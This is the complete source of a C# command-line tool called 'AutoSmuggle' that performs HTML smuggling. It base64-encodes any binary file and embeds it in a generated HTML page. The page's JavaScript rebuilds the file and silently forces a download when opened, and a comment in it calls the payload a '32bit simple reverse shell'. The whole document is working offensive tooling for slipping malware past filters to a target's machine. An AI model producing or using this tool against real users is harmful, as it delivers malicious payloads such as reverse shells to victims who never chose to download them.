using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AutoSmuggle
{
    class Program
    {

        public static string Base64Encode(byte[] plainText)
        {
            String b64data = Convert.ToBase64String(plainText);
            return b64data;
        }
        public static string HTMLSmuggle(string b64string,string filename)
        {

            string htmlbody = "<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->\n" +
                "<html>\n" +
                "    <body>\n" +
                "        <script>\n" +
                "            function base64ToArrayBuffer(base64) {\n" +
                "            var binary_string = window.atob(base64);\n" +
                "            var len = binary_string.length;\n" +
                "           " +
                "\n" +
                "            var bytes = new Uint8Array( len );\n" +
                "                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }\n" +
                "                return bytes.buffer;\n" +
                "            }\n" +
                "\n" +
                "            // 32bit simple reverse shell\n" +
                "            var file = '" +b64string+ "';\n" +
                "            var data = base64ToArrayBuffer(file);\n" +
                "            var blob = new Blob([data], {type: 'octet/stream'});\n" +
                "            var fileName = '"+filename+"';\n" +
                "            if (window.navigator.msSaveOrOpenBlob) {\n" +
                "                window.navigator.msSaveOrOpenBlob(blob,fileName);\n" +
                "            } else { \n" +
                "                var a = document.createElement('a');\n" +
                "                console.log(a);\n" +
                "                document.body.appendChild(a);\n" +
                "                a.style = 'display: none';\n" +
                "                var url = window.URL.createObjectURL(blob);\n" +
                "                a.href = url;\n" +
                "                a.download = fileName;\n" +
                "                a.click();\n" +
                "                window.URL.revokeObjectURL(url);\n" +
                "            }\n" +
                "        </script>\n" +
                "    </body>\n" +
                "</html>";
            System.IO.File.WriteAllText(@"smuggle.html", htmlbody);
            return null;
        }
        public static void PrintError(string error)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(error);
            Console.ResetColor();
        }
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("[*] Trying...");
                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                if (arguments.Count < 2)
                {
                    PrintError("[-] No arguments specified. Autosmuggle <path of file to smuggle> <output of file>.");
                }

                else if (arguments.Count == 2)
                {
                    // byte[] binarypath = new byte[] { };
                    string binarypath = args[0];
                    Console.WriteLine("[+] Reading Data");
                    byte[] streamdata = System.IO.File.ReadAllBytes(binarypath);
                    string b64data = Base64Encode(streamdata);
                    Console.WriteLine("[+] Converting to Base64");
                    string file = args[1];
                    Console.WriteLine("[*] Smuggling in HTML");
                    HTMLSmuggle(b64data,file);
                    Console.WriteLine("[+] File Written to Current Directory...");


                }
            }
            catch (Exception ex)
            {
                PrintError(ex.Message);
            }
        }
    }
}